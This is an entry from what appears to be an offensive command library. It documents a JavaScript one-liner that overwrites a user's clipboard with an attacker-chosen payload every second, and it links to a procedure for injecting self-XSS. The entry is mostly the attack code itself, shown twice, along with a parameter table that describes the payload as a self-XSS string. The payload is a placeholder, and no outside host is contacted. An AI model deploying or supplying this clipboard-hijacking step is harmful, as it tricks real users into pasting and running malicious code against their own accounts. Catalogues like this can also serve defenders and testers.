---
id: cmd-clipboard-generic
data: >-
  setInterval(function(){navigator.clipboard.writeText("PAYLOAD").then(function(text){console.log(text)});},1000)
tags:
  - clipboard
  - javascript
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:06.848Z'
verified: false
validated: true
submitted: true
---
# clipboard-write-interval-generic

## Command

```javascript
setInterval(function(){navigator.clipboard.writeText("PAYLOAD").then(function(text){console.log(text)});},1000)
```

## Description

Repeatedly writes a payload to the user's clipboard every second using Clipboard API, tricking user into having it ready to paste; requires permission.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| PAYLOAD | Self-XSS payload string | Yes |
| interval | 1000ms repeat | Yes |

## Examples

### Basic Usage

```javascript
setInterval(function(){navigator.clipboard.writeText("PAYLOAD").then(function(text){console.log(text)});},1000)
```

### Advanced Usage

Customize payload and interval.

## Expected Output

Console log of written text; requires user permission for clipboard access.

## Related

- [[procedures/Inject-and-Execute-Self-XSS-Payload]]
